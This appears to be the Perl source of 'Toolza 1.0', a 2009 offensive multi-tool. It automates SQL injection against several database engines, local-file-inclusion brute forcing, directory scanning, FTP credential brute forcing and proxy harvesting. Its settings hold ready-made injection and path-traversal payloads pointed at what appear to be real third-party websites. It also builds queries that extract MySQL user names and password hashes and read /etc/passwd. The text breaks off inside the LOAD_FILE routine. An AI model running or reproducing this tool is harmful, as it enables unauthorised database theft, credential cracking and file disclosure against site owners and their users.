#!/usr/bin/perl - UTF-8 encoding
use threads;
use threads::shared;
use IO::Socket;
#use IO::Socket::SSL; # For enable HTTPS support uncomment this line
my $num : shared;
my $good : shared;
my $ck1 : shared;
################################################## #########################
## ?????????? ????????? ??? ???? ??????? | Global settings for all modes ##
################################################## #########################
$test_mode = 0;# when 1 - print get/post page content in terminal0
$method = 0; # 1- Post; 0 - GET ????? ???????? | Post or Get method, 1-POST; 0-GET|||||SAFE POST - with $sql_post, line 27
$get_method = 0; # 0 - via IO::Socket, 1 - via LWP::Simple - if can't get DATA
$use_proxy = 0; # 0 - ??? ??????; 1 - c ?????? | 1 -Use proxy; 0 - No proxy
$proxy = "proxy.txt"; # ???? ? ???????? | Proxy file
$use_socks = 0; # 0 - ??? socks; 1 - c socks | 1 -Use socks; 0 - No socks
$socks_file = "socks.txt";# ???? ? SOCKS | SOCKS file (SOCKS4-5 supported, no authorization)
$kol_threads = 10; # ???-?? ???????, ????????????? -10 | Number of threads - 10 recommended
$timeout = 20; # ??????? ? ???????? | Timeout in seconds
$cookie = 'PHPSESSID=qeqp01ccc006ra904qtaouoct0;b=b'; # ???? ??? ??? - ????????? "" | If no coockie set ""
$https_mode_auth = 1; # 1 - whith authorization, 0 - no
$https_auth_script_path = "/signin.php";
$https_auth_post_data = "uname=qqq&passwd=123&Submit=Sign+In";
$referer = "http://google.com"; # ???????, ???? ??? ????????? "" | If no referer set ""
$user_agent = "Mozilla/5.0 (Windows NT 5.1; U; ru; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 10.10"; # ???? ?????, ???? ??? ????????? "" | If no user agent set ""
$sql_post = ""; # SQLi Post parameter
#$sql_header = "Accept-Language: 1+and+1=1+or";# SQLi Header parametr (include COOKIE), if present before - comment it with "#"
$http_protocol = 1; # 0 - HTTP/1.0; 1 - HTTP/1.1; Default - 1
$pause = 0; # ????? ????? ????????? ? ???????? | Pause between requests in seconds
################################################## ################################################## #####################################
## ???????? ????????? MySQL - ?????? ?????????????? ???? ????????? " ^ " |MySql Basic options - print " ^ " instead of printable field #
################################################## ################################################## #####################################
$source_sql = "http://www.lebow.drexel.edu/Newsroom/Newsletters/index.php?cid=(1)and(0)union+select+1,2,3,^,5,6,7, 8,9,10,11,12";
$filtr = "--+"; # close SQL
$plus = "+"; # /**/,%20,%2b & etc.
$limit = 0; # 0 - no limit; 1 - limit+0,1; 2 - limit+1,1
$unhex = 0; # unhex(hex(DATA))); 0 - disable; 1 - enable
$aes = 0; # AES_DECRYPT(AES_ENCRYPT(DATA),x071),x071); 0 - disable; 1 - enable
$aes_key = "0x71"; # AES key
######################################
## MySql4 brute # URL = $source_sql ##
######################################
$source_table_list = "source_table_list.txt"; # ????-??????? ??? ????? ?????? ? MySql4
$source_column_list = "source_column_list.txt"; # ????-??????? ??? ????? ??????? ? MySql4
######################################
## Site Scanner for folders & files ##
######################################
$scan_url = "site.com"; # ??? ????? ? ?????
$folder_list = "scaner_folder_list.txt"; # ????-??????? ??? ??????? ?????/??????
$error_list = "scaner_errors_list.txt"; # ???? c ???????? ??????? ??????? ??? ???????????? ??????? ?????/?????
###################################
## LFI/READER/Load_file() bruter ##
################################################## ################################################## ######
# LFI/READER/Load_file, ?tc/passwd ???????? ?? " ^ " , ??? ? ? load_file('/etc/passwd') = load_file('/^')#
# ??? ? load_file(0x2f6574632f706173737764) = load_file(^) #
################################################## ################################################## ######
$lrl_url = "http://dominionpropertymanagement.com/index.php?option=com_propiedades&controller=../../../../../../../../../../../^%00";
$lrl_error_message = "require_once"; # ??????? (????? ???????), ??????? ?????, ???? ?????? ???????????? ??????|Message when wrong
$lrl_list = "logs.txt"; # ????-??????? ??? ??????? ?????/?????? | File with paths/files
################################################## ##############################
## Blind SQL-injection ????????? - ??????? +and+mid(version(),1,1)=5--+ ##
################################################## ##############################
$bl_mode = 1; # mode of blind sql injection:
#-----------------------------------------------------------------------------------------------------------------
# mode 0 example - http://site.com/index.php?id=1+and+mid(version(),1,1)=5--+
#in script:
#$bl_url = "http://site.com/index.php?id=1";
#$bl_filtr = "--+";
#$bl_plus = "+";
#$bl_error = "here_wrong_message";
#$bl_error_type = 0;
#-----------------------------------------------------------------------------------------------------------------
# mode 1 example - http://site.com/index.php?id=1+and+1=if((select+mid(version(),1,1) =5),1,(select+1+union+select+2))
#in script:
#$bl_url = "http://site.com/index.php?id=1+and+1=if((select";
#$bl_filtr = "),1,(select+1+union+select+2))";
#$bl_plus = "+";
#$bl_error = "here_wrong_message";
#$bl_error_type = 0;
#-----------------------------------------------------------------------------------------------------------------
$bl_url = "http://www.flygo.ru/1'or"; # url
$bl_filtr = "--'"; # close SQL
$bl_plus = "+"; # /**/,%20,%2b & etc.
$bl_error = '???????'; # ????? ????????????? ???????????/????????????? ??????? | Message when wrong/right query
#$bl_error = 'height="45"'; # ????? ????????????? ???????????/????????????? ??????? | Message when wrong/right query
$bl_error_type = 0; # ??? ?????? ??????????????, 1 - ????? ?????? ??????????, 0 - ????? ?????? ???????????? | Type of message: 1 - when right query, 0 - when wrong query
$bl_your_query = ""; #example - concat_ws(0x3a,table_schema,table_name)
$bl_from = "";#without LIMIT [auto count]!!! Example: +from+information_schema.tables+where+table_name+l ike+0x7573657273
################################################## ################################
## NAME_CONST Blind SQL-injection ????????? - ???????? version() ??? ???? ?? "^"##
################################################## ################################
$nc_url = "http://www.montserrat.edu/galleries/montserrat/index.php?id=(select+min(@:=1)from+(select+1+union +select+2)k+group+by+concat(^,0x3a,@:=@-1))--+^"; # url
$nc_plus = "+"; # /**/,%20,%2b & etc.
################################################## ###########
## ???????? ????????? MySQL injection column number bruter ##
################################################## ###########
$source_sql_c = "http://site.com/more.php?pid=4847+or+1=1";# url
$filtr_c = "--+"; # close SQL
$plus_c = "+"; # /**/,%20,%2b & etc.
$sql_mess = "on line 28";# ????? ????????????? ???????????/????????????? ??????? | Message when wrong number of columns
$sql_mess_type = 0;# ??? ?????? ??????????????, 1 - ????? ?????? ??????????, 0 - ????? ?????? ???????????? | Type of message: 1 - when right query, 0 - when wrong query
$sql_max_column_number = 120; # Max column number for brute
################################################## ###########################################
## FTP checker ##
################################################## ###########################################
$ftp_list = "ftp.txt"; # file with unchecked ftp
$ftp_save = "ftp_good.txt"; # file with checked & good ftp
$ftp_def_port = 21; # default ftp port
################################################## ###########################################
## FTP bruter ##
################################################## ###########################################
$ftp_host = "ftp.example.com"; # ftp host
$ftp_def_port_b = 21; # default ftp port
$ftp_login = ""; # when know login, passwords brute
$ftp_pass_file = "ftp_pass.txt"; # when know login, passwords brute
$ftp_pass = ""; # when know password, logins brute
$ftp_login_file = "ftp_login.txt"; # when know password, logins brute
$ftp_login_pass_file = "ftp_login_pass.txt"; # login:password brute
$ftp_login_pass_del = ":"; # login:password delimetr (:|; & etc)
################################################## ###########################################
## PROXY checker ##
################################################## ###########################################
$proxy_list = "proxy.txt"; # unchecked proxy file
$proxy_save = "proxy_good.txt"; # checked & good proxy file
################################################## ###########################################
## PROXY grabber ##
################################################## ###########################################
$proxy_site_list = "proxy_site_list.txt"; # file with sites with free proxy
################################################## ###########################################
## MSSQL injection ##
################################################## ###########################################
$ms_url = "http://site.com/showSubcategories.aspx?categoryid=1%20or%201="; # url
$ms_spase = "/**/"; #%20,%2b & etc.
$ms_close = ""; #close SQL
$ms_convert_in = 0; # 0 - don't use convert(int,(data)), 1 - use convert(int,(data))
################################################## ################################################## ##################
## PostgreSQL - ?????? ?????????????? ???? ????????? " ^ " | Basic options - print " ^ " instead of printable field #
################################################## ################################################## ##################
$p_union_select_url = "http://example.com/index.php?id=-5+null,^,null"; # url UNION+SELECT method
$p_subquery_url = "http://example.com/index.php?id=-5"; # url SUBQUERY method
$p_method = 0; # 0 - UNION+SELECT method, 1 - SUBQUERY method
$p_filtr = "--+"; # close SQL
$p_plus = "+"; # %20,%2b & etc.
$p_convert = "text"; # convert data type(text,int ... etc.) - for subquery method
################################################## ################################################## #
## Sybase SQL ##
################################################## ################################################## #
$s_union_select_url = "http://example.com/index.php?id=-1+union+select+null,^,null"; # url UNION+SELECT method
$s_subquery_url = "http://example.com/index.php?id=-5"; # url SUBQUERY method
$s_method = 0;# 0 - UNION+SELECT method, 1 - SUBQUERY method
$s_filtr = "--+"; # close SQL
$s_plus = "+"; # /**/,%20,%2b & etc.
$s_convert = "numeric"; # default type to convert - numeric (for subquery method)
################################################## ################################################## #
## Ms Access & Jet SQL ##
################################################## ################################################## #
$a_source_sql = "http://site.com/?l=news&o=display&page=&idx=317"; # url
$a_filtr = ""; # close SQL
$a_plus = "+"; # %20,%2b & etc.
$a_error_code_column_more = "80040e14"; # method ORDER BY - error code when column number is MORE
$a_error_code_table = "80040e37"; # error code when wrong table
$a_error_code_column = "80040e10"; # error code when wrong column
$a_max_column_number = 100; # max column number for brute
################################################## ################################################## ###################
## Oracle SQL - ?????? ?????????????? ???? ????????? " ^ " | Basic options - print " ^ " instead of printable field ##
################################################## ################################################## ###################
$o_source_sql = "http://example.com/index.php?id=-5+null,^,null"; # url
$o_filtr = "--+"; # close SQL
$o_plus = "+"; # %20,%2b & etc.
$o_convert = "char"; # default type to convert printable field - char
################################################## ################################################## ###################
## Firebird/Interbase SQL##
################################################## ################################################## ###################
$fi_source_sql = "http://example.com/image.php?operator=2)+and+1="; # url http://example.com/image.php?operator=2)+and+1=cast(user+as+char(777) )--
$fi_filtr = "--"; # close SQL
$fi_plus = "+"; # %20,%2b & etc.
$fi_convert = "char(777)"; # default data type - char(777)
################################################## ################################################## #
## floor(rand()) MySQL## example: http://example.com/?id=1+or(1,2)=(select+count(*),concat((select+vers ion()+from+information_schema.tables+limit+0,1),0x 3a,floor(rand()*2))+from+information_schema.tables +group+by+2+limit+0,1)--+ # Blind SQL inj alternative
################################################## ################################################## ###################
$f_table = "information_schema.tables"; # default 'information_schema.tables' if MySQL>=5 and if MySQL<5 - you must brute table_name before and print here
$f_url = "http://www.montserrat.edu/galleries/montserrat/index.php?id=(1)or(select(1)from"; # url
$f_plus = "+"; # %20,%2b & etc.
$f_filtr = "--"; # close SQL
################################################## ################################################## #
## ???? ?????? ?? ???????, ???? ?? ?????, ??? ?????? | Don't touch anything below if you don't know what you do ##
################################################## ################################################## ############## ################################################## ################################################## #
if ($method == 1) {
$method = "POST";
} else {
$method = "GET";
}
$search="+";
$replacement=" ";
sub collect {
my $datass = $_[0];
my $cookies = undef;
while($datass =~ /Set-Cookie: (.+?)(;|\r)/igs){
$cookies .= $1."; ";
}
return $cookies;
}
sub req {
my($hosts, $paths, $types, $datas, $cookiess) = @_;
my $https_sock = IO::Socket::SSL->new("$hosts:443");
my $request = "$types $paths HTTP/1.1\n".
"Host: $hosts\n".
"Cookie: $cookiess\n";
if($types eq "POST") {
$request .= "Content-type: application/x-www-form-urlencoded\n".
"Content-Length: ".length($datas)."\n\n".$datas;
} else {
$request .= "\n";
}
print $https_sock $request;
my $answ = undef;
while(my $buf = <$https_sock>) {
$answ .= $buf;
}
return $answ;
}
$socks_check = 0;
$https_flag = 0;
$https_auth_check = 0;
$sql_data_flag = false;
my ($CRLF,$port4,$login,$pass,$sock_res);
$CRLF = "\015\012";
($lrl_start, $lrl_end) = split (/\^/, $lrl_url);
$lrl_url =~ /^http:\/\/?([^\/]+)/i;
$host2 = $1;
$bl_url =~ /^http:\/\/?([^\/]+)/i;
$host3 = $1;
$lrl_url = $lrl_start . "[BRUTE]" . $lrl_end;
$f_url =~ /^http:\/\/?([^\/]+)/i;
$host13 = $1; # floor
$scan_url =~ /^http:\/\/?([^\/]+)/i;
$host1 = $1;
$source_sql_c =~ /^http:\/\/?([^\/]+)/i;
$host5 = $1;
($nc_start,$nc_midle,$nc_end) = split(/\^/,$nc_url);
$nc_url =~ /^http:\/\/?([^\/]+)/i;
$host6 = $1;
#--- default paterns ----#
$ms_pattern_sys_tab = "Syntax error converting the .* value \'(.*)\' to a column of data type"; # regular expression to parse sys & tables
$ms_pattern_sys_tab1 = "Conversion failed when converting the .* value \'(.*)\' to data type"; # regular expression to parse sys & tables
$ms_pattern_columns = "Syntax error converting the .* value \'(.*)\' to a column of data type";# regular expression to parse columns from tables
$ms_pattern_columns1 = "Conversion failed when converting .* value \'(.*)\' to data type"; # regular expression to parse sys & tables
$ms_pattern_data1 = "Syntax error converting the .* value \'(.*)\' to a column of data type";# regular expression to parse DATA from columns v.1
$ms_pattern_data2 = "[SQL Server]Syntax error converting the .* value \'(.*)\' to a column of data type";# regular expression to parse DATA from columns v.2
$ms_pattern_data3 = "Conversion failed when converting .* value \'(.*)\' to data type"; # regular expression to parse sys & tables
$ms_url =~ /^http:\/\/?([^\/]+)/i;
$host7 = $1;
if ($p_method == 0) {
($p_sql_start, $p_sql_end) = split (/\^/, $p_union_select_url);
$p_union_select_url =~ /^http:\/\/?([^\/]+)/i;
$host8 = $1;
}
if ($p_method == 1) {
$p_subquery_url =~ /^http:\/\/?([^\/]+)/i;
$host8 = $1;
}
if ($s_method == 0) {
($ss_sql_start, $ss_sql_end) = split (/\^/, $s_union_select_url);
$s_union_select_url =~ /^http:\/\/?([^\/]+)/i;
$host9 = $1;
}
if ($s_method == 1) {
$s_subquery_url =~ /^http:\/\/?([^\/]+)/i;
$host9 = $1;
}
$p_sql_pref1 = "chr(117)||chr(115)||chr(115)||chr(114)||"; # ?? ????????
$p_sql_pref2 = "||chr(117)||chr(115)||chr(115)||chr(114)"; # ?? ????????
$s_sql_pref1 = "0x75737372||"; # ?? ????????
$s_sql_pref2 = "||0x75737372"; # ?? ????????
$a_source_sql =~ /^http:\/\/?([^\/]+)/i;
$host10 = $1;
$a_sql_pref1 = "chr(94)%2b"; # ?? ????????
$a_sql_pref2 = "%2bchr(94)"; # ?? ????????
($o_sql_start, $o_sql_end) = split (/\^/, $o_source_sql);
$o_source_sql =~ /^http:\/\/?([^\/]+)/i;
$host11 = $1;
$o_sql_pref1 = "chr(117)||chr(115)||chr(115)||chr(114)||"; # ?? ????????
$o_sql_pref2 = "||chr(117)||chr(115)||chr(115)||chr(114)"; # ?? ????????
$fi_source_sql =~ /^http:\/\/?([^\/]+)/i;
$host12 = $1;
$fi_sql_pref1 = 'ascii_char(117)||ascii_char(115)||ascii_char(115) ||ascii_char(114)||'; # ?? ????????
$fi_sql_pref2 = '||ascii_char(117)||ascii_char(115)||ascii_char(11 5)||ascii_char(114)'; # ?? ????????
print "-----------------------------------------\n";
$sql_pref1 = "CONCAT(0x75737372,"; # ?? ????????
$sql_pref2 = ",0x75737372)"; # ?? ????????
if ($aes == 1) {
$sql_CP_start = "AES_DECRYPT(AES_ENCRYPT(";
$sql_CP_end = "," . $aes_key . ")," . $aes_key . ")";
}
if ($unhex == 1) {
$sql_CP_start = "UNHEX(HEX(";
$sql_CP_end = "))";
}
if (($aes == 0) && ($unhex == 0)) {
$sql_CP_start = "";
$sql_CP_end = "";
}
if ($limit == 0) {
$limit = "";
}
if ($limit == 1) {
$limit = $plus . "limit" . $plus . "0,1";
}
if ($limit == 2) {
$limit = $plus . "limit" . $plus . "1,1";
}
if ($use_proxy == 1) {
print "----------------------------------------\n";
print "You choose mode with proxy, try to find good in $proxy ...\n";
print "Timeout = $timeout sec:\n";
print "----------------------------------------\n";
$proxy_flag = 0;
open(FILE9, "<", $proxy);
while(<FILE9>) {
chomp;
push(@prox, $_);
}
close(FILE9);
$size = @prox;
$i = 0;
while ($i < $size) {
$current_proxy = $prox[$i];
($current_proxy_host,$current_proxy_port) = split(/:/,$current_proxy);
if ($socket=IO::Socket::INET->new( PeerAddr => $current_proxy_host, PeerPort => $current_proxy_port, PeerProto => 'tcp', TimeOut => $timeout)) {
print "Will use --> $current_proxy_host:$current_proxy_port\n";
$proxy_flag = 1;
$proxy_message = "$current_proxy_host:$current_proxy_port";
$i = $size;
} else {
print "$current_proxy_host:$current_proxy_port - Bad proxy\n";
}
$i++;
}
if ($proxy_flag == 0) {
print "----------------------------------------\n";
print "No good proxy in " . $proxy . ", change mode. Exit...\n";
exit;
}
} else {
$proxy_message = "no";
}
$flag_check = 0;
print "-----------------------------------------\n";
print "Toolza 1.0 by Pashkela [ BugTrack Team ] (c) 2009\n";
START_global:
if ($get_method == 1) {
print "------------------------------------------------------------------------------\n";
print "===================> Only GET-method, no proxy, no socks! <===================\n";
print "------------------------------------------------------------------------------\n";
}
print "----------------------------------------------------------\n";
print " Choose mode:\n";
print "----------------------------------------------------------\n";
print " [1] Mysql injection\n";
print " [2] MSSQL injection\n";
print " [3] PostgreSQL injection\n";
print " [4] Sybase SQL injection\n";
print " [5] Access & Jet SQL injection\n";
print " [6] Oracle SQL injection\n";
print " [7] Firebird/Interbase SQL injection\n";
print " ================================================== =====\n";
print " [8] LFI/Reader/Load_file() bruter\n";
print " [9] Scan site for folders & files\n";
print " [10] FTP checker\n";
print " [11] FTP bruter\n";
print " [12] Proxy checker\n";
print " [13] Proxy grabber\n";
print " ================================================== =====\n";
print " [14] Exit\n";
print "----------------------------------------------------------\n";
if($sql_post and !$sql_header){
$method = "POST";
$sql_flag = 1; 
print "SQLi in POST parameter...\n";
($sql_start, $sql_end) = split (/\^/, $sql_post);
$source_sql =~ /^http:\/\/?([^\/]+)/i;
$host100 = $1; # source_sql host
}elsif(!$sql_post and $sql_header){ 
$sql_flag = 2; 
print "SQLi in HEADER parameter...\n";
$sql_header =~ s!\Q$search!$replacement!g;
($sql_start, $sql_end) = split (/\^/, $sql_header);
$source_sql =~ /^http:\/\/?([^\/]+)/i;
$host100 = $1; # source_sql host
}elsif($sql_post and $sql_header){
print "================================================== ========================\n";
print "SQLi in HEADER parameter[\$sql_post] and in POST parametr[\$sql_header]\n";
print "in \"Global settings\" section - don't supported, choose one, exit...\n"; 
print "================================================== ========================\n";
exit; 
}else{
print "SQLi in GET parameter...\n";
$sql_flag = 0; 
($sql_start, $sql_end) = split (/\^/, $source_sql);
$source_sql =~ /^http:\/\/?([^\/]+)/i;
$host100 = $1; # source_sql host
}
$choice = <STDIN>;
chomp $choice;
print "Your choice: $choice\n";
## Mysql ################################################## ################################################## ###########
if ($choice == 1) {
START:
if ($source_sql =~ m/^https:\/\/?([^\/]+)/i) {
$host100 = $1;
$https_flag = 1;
print "----------------------\n";
print "HTTPS mode enabled\n";
print "----------------------\n";
}
$host = $host100;
if ($https_mode_auth == 1 && $https_auth_check == 0 && $https_flag == 1) {
print "-----------------------------------------\n";
print "Authorization required, wait please....";
my $answ1 = req($host, $https_auth_script_path, 'POST', $https_auth_post_data, 0);
$ck1 = collect($answ1);
$https_auth_check = 1;

print " DONE\n";
print "-----------------------------------------\n";
}
sub ascii_to_hex($) {

(my $str = shift) =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
$str = "0x" . $str;
return $str;
}
if ($use_socks == 1 && $socks_check == 0) {
$check_url = $host;
our $query = "GET / HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Referer: http://" . $check_url . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090716 Ubuntu/9.04 (jaunty) Shiretoko/3.5.1\r\n"
. "Connection: close\r\n\r\n";
print "----------------------------------------\n";
print "You choose mode with SOCKS, try to find good in $socks_file ...\n";
print "Timeout = 5 sec:\n";
print "----------------------------------------\n";
$socks_check = 0;
$check_socks = socks_check();
($current_proxy_host,$current_proxy_port,$socks_ty pe) = split(/:/,$check_socks);
$proxy_message = "$current_proxy_host:$current_proxy_port, SOCKS" . $socks_type;
if ($current_proxy_host) {
$socks_check = 1;
print "Will use --> $proxy_message\n";
} else {
$socks_check = 0;
$proxy_message = "No";
print "No good SOCKS in " . $socks_file . ", change mode. Exit...\n";
}
}
print "----------------------------------------------------------\n";
print " Choose mode:\n";
print "----------------------------------------------------------\n";
print " [1] Mysql inj system information\n";
print " [2] Mysql inj get DB-names from information_schema.schemata\n";
print " [3] Mysql inj get tables from DB-name\n";
print " [4] Mysql inj get column_name from tables from DB-name\n";
print " [5] Mysql inj get tables from information_schema (current DB)\n";
print " [6] Mysql inj get column_name from table (current DB)\n";
print " [7] Mysql inj get data from columns\n";
print " [8] Mysql inj brute tables & columns\n";
print " [9] Mysql inj column number bruter\n";
print " [10] Mysql inj Blind\n";
print " [11] Mysql inj NAME_CONST\n";
print " [12] Mysql inj floor(rand())\n";
print " [13] Mysql inj LOAD_FILE (file_priv = Y)\n";
print "----------------------------------------------------------\n";
print " [14] Main menu\n";
print "----------------------------------------------------------\n";
$choice = <STDIN>;
chomp $choice;
print "Your choice: $choice\n";
if ($choice == 1) {
open( FILE, ">>" . "z_" . $host . ".txt" ); # ???? ??? ?????? ???????????
if ($flag_check == 0) {
$url0 = $sql_start . $sql_CP_start . "SQL" . $sql_CP_end . $sql_end . $limit . $filtr;
$flag_check = 1;
print "-----------------------------------------\n";
print "Check basic options:\n";
print "-------------------\n";
print "$url0\n";
print FILE "$url0\n";
}
#### ?????? ?????? ################################################## ###
$url1 = $sql_start . $sql_CP_start . $sql_pref1 . "concat(0x7665723a,version())" . $sql_pref2 . $sql_CP_end . $sql_end . $limit . $filtr;
#### ?????? ??? ???? ################################################## ###
$url2 = $sql_start . $sql_CP_start . $sql_pref1 . "concat(0x626173653a,database())" . $sql_pref2 . $sql_CP_end . $sql_end . $limit . $filtr;
#### ?????? ????? ################################################## ###
$url3 = $sql_start . $sql_CP_start . $sql_pref1 . "concat(0x757365723a,user())" . $sql_pref2 . $sql_CP_end . $sql_end . $limit . $filtr;
#### ?????? @@basedir ################################################## ###
$url4 = $sql_start . $sql_CP_start . $sql_pref1 . "concat(0x626173656469723a," . "@@" . "basedir)" . $sql_pref2 . $sql_CP_end . $sql_end . $limit . $filtr;
#### ?????? @@datadir ################################################## ###
$url5 = $sql_start . $sql_CP_start . $sql_pref1 . "concat(0x646174616469723a," . "@@" . "datadir)" . $sql_pref2 . $sql_CP_end . $sql_end . $limit . $filtr;
#### ?????? @@tmpdir ################################################## ###
$url6 = $sql_start . $sql_CP_start . $sql_pref1 . "concat(0x746d706469723a," . "@@" . "tmpdir)" . $sql_pref2 . $sql_CP_end . $sql_end . $limit . $filtr;
#### ?????? @@version_compile_os ################################################## ###
$url7 = $sql_start . $sql_CP_start . $sql_pref1 . "concat(0x6f733a," . "@@" . "version_compile_os)" . $sql_pref2 . $sql_CP_end . $sql_end . $limit . $filtr;
#### ?????? mysql.user ################################################## ###
$url8 = $sql_start . $sql_CP_start . $sql_pref1 . "concat(0x6d7973716c2e757365723a,user)" . $sql_pref2 . $sql_CP_end . $sql_end . $plus . "from" . $plus . "mysql.user" . $limit . $filtr;
#### ?????? mysql.password ################################################## ###
$url9 = $sql_start . $sql_CP_start . $sql_pref1 . "concat(0x6d7973716c2e70617373776f72643a,password)" . $sql_pref2 . $sql_CP_end . $sql_end . $plus . "from" . $plus . "mysql.user" . $limit . $filtr;
#### ?????? file_priv ################################################## ###
$url10 = $sql_start . $sql_CP_start . $sql_pref1 . "concat(0x66696c655f707269763a,file_priv)" . $sql_pref2 . $sql_CP_end . $sql_end . $plus ."from" . $plus . "mysql.user" . $plus . "where" . $plus . "user=user" . $limit . $filtr;
################################################## ###################
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
print "-----------------------------------------\n";
print "System information:\n";
print "-----------------------------------------\n";
print FILE "-----------------------------------------\n";
print FILE "HOST: $host\n";
print FILE "-----------------------------------------\n";
print FILE "System information:\n";
print FILE "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets1);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets1 {
@array = ($url1,$url2,$url3,$url4,$url5,$url6,$url7,$url8,$ url9,$url10,$url11);
$size = @array; #???????? ?????? ???????
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
if($sql_flag == 0){
$current = $array[$num];
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $source_sql;
$sql_post = $array[$num];
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $source_sql;
$sql_header_query = $array[$num];
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
}
if ($content =~ m/ussr(.*?)ussr/imgs) {
print $1 . "\n";
print FILE $1 . "\n";
}
print $num . "\r";
sleep $pause;
}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START;
}
#### ??????? ?? ################################################## ################################################
if ($choice == 2) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
## ???-?? ?? ? information_schema.schemata ##
$url11 = $sql_start . $sql_pref1 . "count(schema_name)" . $sql_pref2 . $sql_end . $plus . "from" . $plus . "information_schema.schemata" . $limit . $filtr; # ??????? ???-?? ??
if($sql_flag == 0){
$current = $url11;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $source_sql;
$sql_post = $url11;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $source_sql;
$sql_header_query = $url11;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
}
$bd_num = $content;
$bd_num =~ m/ussr(.*?)ussr/img;
$bd_num = $1;
print FILE "-----------------------------------------\n";
print FILE "Data bases in information_schema.schemata: $bd_num\n";
print FILE "-----------------------------------------\n";
print "-----------------------------------------\n";
print "Data bases in information_schema.schemata - $1\n";
print "-----------------------------------------\n";
$url12 = $sql_start . $sql_CP_start . $sql_pref1 . "schema_name" . $sql_pref2 . $sql_CP_end . $sql_end . $plus . "from" . $plus . "information_schema.schemata";
$num = -1; # ?? ????????
$thr = $kol_threads; # ???-?? ???????
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets5050);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets5050 {
$| = 1;
while ($num<=$bd_num) {
{ lock($num);
$num++; }
if($sql_flag == 0){
$current = $url12 . $plus . "limit" . $plus . $num . ",1" . $filtr; 
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $source_sql;
$sql_post = $url12 . $plus . "limit" . $plus . $num . ",1" . $filtr; 
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $source_sql;
$sql_header_query = $url12 . $plus . "limit" . $plus . $num . ",1" . $filtr; 
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
}
if ($content =~ m/ussr(.*?)ussr/img) {
print $1 . "\n";
print FILE $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START;
}
if ($choice == 3) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter the DB-name: ";
$choice = <STDIN>;
chomp $choice;
if ($choice =~ m/-/imgs) {$choice = "`" . $choice . "`"}
print "DB-name: $choice\n";
print "----------\n";
$choice1 = ascii_to_hex $choice;
## ???-?? tables ? information_schema.schemata ##
$url11 = $sql_start . $sql_pref1 . "count(table_name)" . $sql_pref2 . $sql_end . $plus . "from" . $plus . "information_schema.tables" . $plus . "where" . $plus . "table_schema=" . $plus . $choice1 . $limit . $filtr;
if($sql_flag == 0){
$current = $url11;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $source_sql;
$sql_post = $url11;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $source_sql;
$sql_header_query = $url11; 
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
}
$current = $url11;
$tab_num1 = $content;
$tab_num1 =~ m/ussr(.*?)ussr/img;
$tab_num1 = $1;
print FILE "-----------------------------------------\n";
print FILE "Tables in DB [$choice]: $tab_num1\n";
print FILE "-----------------------------------------\n";
print "-----------------------------------------\n";
print "Tables in DB [$choice]: $tab_num1\n";
print "-----------------------------------------\n";
$url12 = $sql_start . $sql_CP_start . $sql_pref1 . "table_name" . $sql_pref2 . $sql_CP_end . $sql_end . $plus . "from" . $plus . "information_schema.tables" . $plus . "where" . $plus . "table_schema=" . $plus . $choice1 ;
$num = -1; # ?? ????????
$thr = $kol_threads; # ???-?? ???????
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets5051);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets5051 {
$| = 1;
while ($num<$tab_num1) {
{ lock($num);
$num++; }
if($sql_flag == 0){
$current = $url12 . $plus . "limit" . $plus . $num . ",1" . $filtr;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $source_sql;
$sql_post = $url12 . $plus . "limit" . $plus . $num . ",1" . $filtr;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $source_sql;
$sql_header_query = $url12 . $plus . "limit" . $plus . $num . ",1" . $filtr; 
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
if ($content =~ m/ussr(.*?)ussr/img) {
print $1 . "\n";
print FILE $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START;
}
if ($choice == 13) {
M_LOAD_FILE: 
open( FILE1, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter file name (example: /etc/passwd) or type <exit> for main menu: ";
$choice = <STDIN>;
chomp $choice;
if ($choice eq "exit") {close(FILE);goto START;}
print "File name for read: $choice\n";
